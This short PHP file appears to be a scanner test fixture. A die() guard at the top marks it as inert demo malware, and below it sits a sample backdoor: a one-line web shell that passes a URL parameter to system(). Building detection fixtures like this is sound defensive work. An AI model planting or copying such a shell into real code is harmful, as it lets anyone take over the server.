<?php die('LW-SCAN DEMO MALWARE - inert test fixture, does nothing'); ?>
<?php
// lw:0005 backdoor - shell exec fed with request input (infected)
system($_GET['cmd']);
